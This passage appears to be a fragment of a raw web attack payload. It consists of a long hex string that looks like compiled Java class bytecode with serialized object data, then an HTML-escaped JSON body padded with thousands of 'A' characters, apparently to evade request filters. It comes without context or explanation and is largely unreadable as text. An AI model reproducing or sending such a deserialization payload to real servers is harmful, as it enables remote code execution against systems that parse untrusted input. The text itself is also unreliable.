B8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;}, &quot;b&quot;: { &quot;a&quot;: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA